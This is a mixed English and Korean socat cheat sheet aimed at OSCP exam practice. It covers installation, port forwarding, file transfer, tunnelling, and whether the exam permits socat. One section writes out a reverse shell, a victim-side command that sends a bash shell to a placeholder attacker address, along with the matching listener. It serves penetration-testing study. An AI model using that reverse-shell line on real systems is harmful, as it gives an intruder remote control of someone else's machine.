```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

1. **패키지 리스트 업데이트**:

   ```
   sudo apt update
   ```

2. **socat 설치**:
   ```
   sudo apt install socat
   ```

설치 후 버전을 확인하려면 `socat -V` 명령어를 실행하세요. Ubuntu 22.04 (Jammy) 기준으로 최신 버전(예: 1.7.4.4)이 설치됩니다. 만약 최신 버전이 필요하다면 소스에서 컴파일할 수 있지만, 일반적으로 apt로 충분합니다.

### socat 사용법 및 실용적인 명령어 세트

socat (SOcket CAT)은 두 개의 양방향 바이트 스트림 간 데이터 전송을 위한 강력한 도구입니다. netcat(nc)의 확장 버전으로, 파일, 파이프, 장치, 소켓(TCP/UDP/Unix/SSL 등)을 연결할 수 있습니다. 기본 구문은 다음과 같습니다:

```
socat [옵션] <주소1> <주소2>
```

- **주소(Address)**: 연결할 데이터 채널을 지정 (예: TCP4:host:port, STDIO(-), FILE:/path, EXEC:'command').
- **옵션**: `-d -d` (디버그), `-u` (단방향), `fork` (다중 연결 허용), `reuseaddr` (포트 재사용) 등.

#### 1. **기본 연결 및 쉘 공유 (Reverse Shell)**

- **리버스 쉘 생성 (공격자 측 리스너)**:
  ```
  socat TCP-LISTEN:4444,reuseaddr,fork -
  ```
  - 포트 4444에서 연결 대기. `fork`로 다중 연결 허용. `-`은 STDIO(표준 입력/출력) 연결.
- **피해자 측에서 쉘 전송**:
  ```
  socat TCP:attacker_ip:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
  ```
  - bash 쉘을 pty(터미널)로 실행. `sigint`로 Ctrl+C 처리.
  - -l 사용자 로그인 쉘 사용

#### 2. **포트 포워딩 (Port Forwarding)**

- **로컬 포트 포워딩 (로컬 8080 → 원격 80)**:
  ```
  socat TCP-LISTEN:8080,reuseaddr,fork TCP:remote_host:80
  ```
  - 로컬 8080 포트로 들어온 트래픽을 remote_host:80으로 전달.
- **리버스 포트 포워딩 (원격 포트 → 로컬)**:
  ```
  socat TCP-LISTEN:remote_port,fork TCP:local_host:local_port
  ```
  - 원격에서 연결 시 로컬로 트래픽 전달 (예: bastion 호스트 우회).

#### 3. **파일 전송**

- **파일 업로드 (클라이언트 측)**:
  ```
  socat -u FILE:/local/path TCP:remote_host:9999
  ```
  - `-u`로 단방향 전송. 원격에서 `socat TCP-LISTEN:9999,reuseaddr - > /remote/path` 실행.
- **대용량 파일 tail -f 스타일 모니터링**:
  ```
  socat -u /tmp/logfile,seek-end=0,ignoreeof -
  ```
  - 파일 끝부터 실시간 읽기 (로그 모니터링에 유용).

#### 4. **시리얼 포트 또는 장치 연결**

- **시리얼 포트 (ttyUSB0)와 TCP 연결**:
  ```
  socat /dev/ttyUSB0,raw,echo=0,crnl TCP-LISTEN:1234,reuseaddr
  ```
  - 시리얼 장치(/dev/ttyUSB0)를 TCP 1234 포트로 노출. `crnl`로 줄바꿈 변환.

#### 5. **프록시 또는 SSL 터널링**

- **HTTP 프록시 통해 연결**:
  ```
  socat TCP-LISTEN:8888,fork PROXY:proxy_host:80,proxyport=3128
  ```
  - SOCKS/HTTP 프록시 우회.
- **SSL 연결 (간단한 서버)**:
  ```
  socat OPENSSL-LISTEN:4433,reuseaddr,cert=server.crt,key=server.key,fork STDOUT
  ```
  - SSL 서버 생성 (인증서 필요).

#### 6. **기타 유용한 옵션 및 팁**

- **디버그 활성화**: `-d -d` 추가로 로그 출력 (문제 해결 시 필수).
- **인터랙티브 쉘 (SSH-like)**:
  ```
  socat -,echo=0,raw EXEC:'ssh user@host',pty,setsid,ctty
  ```
  - 로컬 터미널에서 SSH 실행, 제어 문자(Ctrl+C) 전달.
- **웹 서버 대체 (간단한 HTTP 응답)**:
  ```
  socat TCP-LISTEN:10081,reuseaddr,fork,crlf SYSTEM:"echo 'HTTP/1.0 200 OK\n\nHello World'"
  ```

이 명령어들은 man 페이지(`man socat`)나 예제 파일(`/usr/share/doc/socat/examples/`)에서 더 확장할 수 있습니다. 실습 시 Kali Linux나 HTB/Vulnhub에서 테스트하세요.

### OSCP 시험에서 socat 허용 여부

네, OSCP 시험에서 socat은 **허용됩니다**. Offensive Security의 공식 가이드(OSCP+ Exam Guide)에 따르면, socat은 고급 터널링과 쉘 통신을 위한 도구로 명시적으로 허용된 목록에 포함됩니다. PWK 자료에서도 socat 사용 예제가 포함되어 있으며, 펜테스터들이 자주 사용하는 netcat 대안으로 활용됩니다. 다만, 자동화 스크립트나 제한된 기능(예: Metasploit 전체 사용 금지)을 피하세요. 시험 중 socat 바이너리를 업로드해 사용하는 것도 일반적입니다.

추가 팁: OSCP 시험에서 socat은 리버스 쉘 안정화나 포트 포워딩에 유용하지만, ligolo-ng 같은 대안도 고려하세요. (OffSec FAQ 참조)
